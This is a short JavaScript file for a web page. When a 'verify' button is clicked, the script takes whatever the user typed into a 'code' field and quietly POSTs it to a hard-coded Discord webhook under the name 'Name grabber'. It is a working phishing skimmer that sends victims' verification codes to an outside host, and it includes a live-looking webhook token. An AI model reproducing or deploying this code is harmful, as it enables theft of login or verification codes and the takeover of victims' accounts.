
window.onload=function(){
    document.getElementById("verify").addEventListener("click", a);
}

function a() {
    const code = document.getElementById("code");

    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1002524522609651772/8eVE6z3RnfzNI6Wakz9vbdCy2FtNQJOhNScLKzT3FzxFGSJJIHBgiXI0XhTMkPXyeU1q");

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
      username: "Name grabber",
      avatar_url: "",
      content: "CODE:" + code.value
    }

    request.send(JSON.stringify(params));
    console.log("CODE:" + code.value)
  };